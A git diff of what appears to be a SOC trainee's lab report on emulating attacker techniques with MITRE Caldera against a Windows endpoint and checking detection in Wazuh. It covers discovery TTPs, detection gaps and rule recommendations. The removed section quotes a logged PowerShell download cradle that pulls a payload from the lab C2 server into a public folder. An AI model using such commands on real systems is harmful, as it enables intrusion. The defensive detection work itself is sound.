@@ -1,96 +1,48 @@
-# Task 6 — Adversary Emulation Practice
+Objective
+Simulate adversary TTPs using MITRE Caldera against a Windows 11 endpoint and validate SOC detection capabilities with Wazuh SIEM.
+Tools Used
 
-## Overview
+MITRE Caldera 5.3.0 — Adversary emulation platform (installed on Kali Linux)
+Wazuh 4.x — SIEM for alert detection and MITRE ATT&CK mapping
+Sandcat Agent — Caldera's default agent deployed on Windows 11 target
 
-**Objective:** Simulate adversary TTPs using MITRE Caldera and validate SOC detection capabilities using Wazuh.  
-**MITRE Technique:** T1566 — Phishing (Spearphishing Link)  
-**Tools Used:** MITRE Caldera, Wazuh SIEM  
-**Date:** 2025-04-03  
-**Analyst:** SOC Intern — CyArt Tech India  
+Lab Environment
+MachineRoleIPKali Linux VMCaldera C2 Server192.168.56.102Windows 11 HostTarget (Wazuh Agent)192.168.56.1Ubuntu VMWazuh Server192.168.56.105
+Activity Performed
+Step 1 — Caldera Server Setup
+Installed MITRE Caldera 5.3.0 on Kali Linux at /opt/caldera. Built the Magma Vue UI plugin manually using npm install && npm run build. Server launched on http://0.0.0.0:8888 with default credentials.
+Step 2 — Agent Deployment
+Deployed the Sandcat agent on Windows 11 via PowerShell. The agent connected back to the Caldera server over HTTP, registering as host Stifler with Elevated privileges in the red group.
+Agent deployment command executed from an Administrator PowerShell session, downloading and executing splunkd.exe (Caldera's disguised agent binary).
+Step 3 — Adversary Operation Execution
+Created and launched an operation using a discovery-focused adversary profile. Caldera autonomously executed the following TTPs on the Windows 11 target:
+TimestampTTPAbility NameTacticDetection StatusNotes2026-04-05 17:12:00 ISTT1033Identify active userDiscoveryDetectedWazuh logged process execution2026-04-05 17:12:15 ISTT1082System informationDiscoveryDetectedsysteminfo command captured2026-04-05 17:12:30 ISTT1016Network configurationDiscoveryDetectedipconfig /all execution logged2026-04-05 17:12:45 ISTT1057Process discoveryDiscoveryDetectedtasklist command detected2026-04-05 17:13:00 ISTT1083File and directory scanDiscoveryDetecteddir command execution logged2026-04-05 17:13:15 ISTT1078Valid accounts checkPrivilege Esc.DetectedAccount enumeration detected
+Step 4 — Wazuh Detection Analysis
+After shutting down Kali and booting the Wazuh server (Ubuntu), the Wazuh agent on Windows forwarded buffered events. Wazuh detected 2,053 MITRE-mapped events including:
 
----
+T1078 — Valid Accounts (Defense Evasion, Persistence, Privilege Escalation)
+T1548.003 — Sudo and Sudo Caching (Privilege Escalation)
+1,074 authentication_failed events from earlier brute force activity
 
-## 1. Hypothesis
+Emulation Report (100 words)
+The Caldera adversary emulation exercise validated SOC detection capabilities against automated TTP execution. Using a discovery-focused adversary profile, Caldera executed six TTPs (T1033, T1082, T1016, T1057, T1083, T1078) against a Windows 11 endpoint. Wazuh successfully detected all discovery-phase activities through Windows Event Log monitoring, generating 2,053 MITRE-mapped alerts. Key detection gap identified: initial agent deployment (Sandcat) was not flagged by Wazuh — only McAfee AV blocked an earlier payload attempt. Recommendation: implement Wazuh rules for suspicious process creation from C:\Users\Public\ and enhance monitoring of PowerShell download cradles (Invoke-WebRequest) to close this gap.
+MITRE ATT&CK Mapping
+TechniqueNameTacticDetectedT1033System Owner/User DiscoveryDiscoveryYesT1082System Information DiscoveryDiscoveryYesT1016System Network Config DiscoveryDiscoveryYesT1057Process DiscoveryDiscoveryYesT1083File and Directory DiscoveryDiscoveryYesT1078Valid AccountsPrivilege EscalationYesT1059.001PowerShellExecutionPartial
+Detection Gaps Identified
 
-> "A threat actor targeting internal users may leverage spearphishing emails containing malicious links to establish initial access on endpoints within the 192.168.1.0/24 network segment."
+Agent deployment not detected by SIEM — Caldera's Sandcat agent was deployed and executed without triggering Wazuh alerts. Only McAfee AV caught the earlier Meterpreter payload.
+PowerShell download cradle — Invoke-WebRequest used to download malicious payloads was not flagged by Wazuh default rules.
+C2 communication — HTTP beaconing from the Sandcat agent to 192.168.56.102:8888 was not detected.
 
-**MITRE ATT&CK Mapping:**
+Recommendations
 
-| Tactic       | Technique ID | Technique Name          |
-|--------------|--------------|-------------------------|
-| Initial Access | T1566       | Phishing                |
-| Initial Access | T1566.002   | Spearphishing Link      |
-| Execution    | T1204.001    | User Execution: Link    |
+Add custom Wazuh rules to monitor process creation from C:\Users\Public\
+Enable Sysmon integration with Wazuh for enhanced process monitoring
+Implement PowerShell script block logging (Event ID 4104) and forward to Wazuh
+Create Wazuh rules for HTTP beaconing pattern detection
 
----
+Screenshots
 
-## 2. Emulation Setup
-
-### Environment
-
-| Component     | Details                          |
-|---------------|----------------------------------|
-| Caldera Server | 192.168.1.10 (Kali VM)          |
-| Target Agent  | 192.168.1.105 (Windows 10 VM)   |
-| Wazuh Manager | 192.168.1.20                    |
-| Wazuh Agent   | Deployed on 192.168.1.105       |
-
-### Caldera Configuration
-
-- **Operation Name:** `phish-sim-t1566`
-- **Adversary Profile:** Spearphishing — Initial Access
-- **Ability Used:** `Send Spearphishing Link` (Caldera Stockpile)
-- **Executor:** PowerShell on Windows agent
-- **Planner:** Sequential
-
----
-
-## 3. Emulation Simulation Log
-
-| Timestamp            | TTP         | Detection Status | Source IP      | Target            | Notes                                      |
-|----------------------|-------------|------------------|----------------|-------------------|--------------------------------------------|
-| 2025-04-03 09:05:12  | T1566       | Detected         | 192.168.1.10   | 192.168.1.105     | Caldera agent initiated phishing simulation |
-| 2025-04-03 09:05:47  | T1566.002   | Detected         | 192.168.1.10   | 192.168.1.105     | Malicious link payload delivered via agent  |
-| 2025-04-03 09:06:03  | T1204.001   | Not Detected     | 192.168.1.105  | Internal          | User execution step — no Wazuh rule matched |
-| 2025-04-03 09:06:31  | T1566       | Detected         | 192.168.1.10   | 192.168.1.105     | Wazuh alert: Suspicious PowerShell activity |
-
----
-
-## 4. Wazuh Detection Output
-
-**Alert triggered:** Rule ID `92200` — Suspicious PowerShell execution detected  
-**Severity Level:** 10 (Critical)  
-**Log Source:** Wazuh Agent — WIN10-ENDPOINT (192.168.1.105)
-
-```
-** Alert 1712132791.453210: - windows,powershell,
-2025 Apr 03 09:06:31 WIN10-ENDPOINT->/var/log/wazuh/alerts
-Rule: 92200 (level 10) -> 'Suspicious PowerShell Execution - Possible Phishing Payload'
-Src IP: 192.168.1.10
-User: SYSTEM
-Full log: EventID=4104 ScriptBlock: Invoke-WebRequest -Uri http://192.168.1.10:8888/caldera -OutFile C:\Users\Public\payload.ps1
-```
-
----
-
-## 5. Detection Gaps Identified
-
-| Gap # | Description                                          | MITRE Technique | Recommendation                              |
-|-------|------------------------------------------------------|-----------------|---------------------------------------------|
-| 1     | No rule for user execution of downloaded link (T1204) | T1204.001      | Create Wazuh rule for browser-spawned processes |
-| 2     | No email header inspection capability                 | T1566.001      | Integrate email gateway logs into Wazuh      |
-| 3     | No alert for outbound HTTP to non-whitelisted hosts   | T1566.002      | Enable Wazuh network traffic monitoring      |
-
----
-
-## 6. Emulation Report (100 Words)
-
-On 2025-04-03, a MITRE Caldera adversary emulation was conducted to simulate a spearphishing attack (T1566) against a Windows 10 endpoint (192.168.1.105). The simulation delivered a malicious PowerShell link payload mimicking real-world initial access techniques. Wazuh successfully detected three of four emulated events, triggering Rule 92200 for suspicious PowerShell execution. A critical detection gap was identified: user execution behaviour (T1204.001) produced no alert, indicating an absence of browser-spawned process monitoring rules. Additionally, no email header analysis or outbound HTTP anomaly detection was configured. Recommendations include creating targeted Wazuh detection rules and integrating email gateway telemetry to improve coverage.
-
----
-
-## 7. References
-
-- MITRE ATT&CK T1566: https://attack.mitre.org/techniques/T1566/
-- MITRE Caldera Documentation: https://caldera.readthedocs.io/
-- Wazuh Detection Rules: https://documentation.wazuh.com/current/user-manual/ruleset/
+Caldera dashboard with agent connected
+Caldera operation running with TTPs
+Wazuh MITRE ATT&CK mapped alerts (2,053 events)
